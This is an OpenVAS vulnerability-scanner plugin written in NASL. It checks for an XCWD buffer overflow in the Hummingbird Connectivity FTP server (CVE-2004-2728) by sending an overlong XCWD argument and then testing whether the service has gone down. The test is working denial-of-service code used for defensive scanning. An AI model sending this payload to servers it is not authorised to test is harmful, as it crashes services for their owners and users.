# OpenVAS Vulnerability Test
# $Id: hummingbird_ftp_overflow.nasl 13610 2019-02-12 15:17:00Z cfischer $
# Description: Hummingbird Connectivity FTP service XCWD Overflow
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

#  Ref:  CESG Network Defence Team  - http://www.cesg.gov.uk/

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15613");
  script_version("$Revision: 13610 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 16:17:00 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"3.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:N/I:N/A:P");
  script_cve_id("CVE-2004-2728");
  script_bugtraq_id(11542);
  script_name("Hummingbird Connectivity FTP service XCWD Overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to a newer version when available.");

  script_tag(name:"summary", value:"The remote host is running the Hummingbird Connectivity FTP server.

  It was possible to shut down the remote FTP server by issuing
  a XCWD command followed by a too long argument.");

  script_tag(name:"impact", value:"This problem allows an attacker to prevent the remote site
  from sharing some resources with the rest of the world.");

  exit(0);
}

include("ftp_func.inc");

port = get_ftp_port(default:21);

soc = open_sock_tcp(port);
if(soc)
{
  kb_creds = ftp_get_kb_creds();
  login = kb_creds["login"];
  password = kb_creds["pass"];

  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
    s = string("XCWD ", crap(256), "\r\n");
    send(socket:soc, data:s);
    r = recv_line(socket:soc, length:1024);
    close(soc);

    soc = open_sock_tcp(port);
    if(!soc)
    {
      security_message(port);
      exit(0);
    }
  }
  close(soc);
}